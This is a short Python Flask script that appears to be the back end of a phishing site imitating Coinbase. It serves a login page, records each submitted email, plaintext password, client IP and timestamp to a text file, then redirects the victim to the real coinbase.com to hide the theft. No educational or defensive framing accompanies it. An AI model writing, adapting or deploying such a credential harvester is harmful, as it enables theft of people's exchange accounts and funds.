from flask import Flask, request, redirect
import datetime
import os

app = Flask(__name__)

@app.route('/')
def index():
    return open('index.html').read()

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    timestamp = datetime.datetime.now().strftime('%Y-%m-d %H:%M:%S')
    ip = request.remote_addr
    
    with open("logins.txt", "a") as f:
        f.write(f"{timestamp} | {ip} | {email} | {password}\n")
    
    return redirect("https://coinbase.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
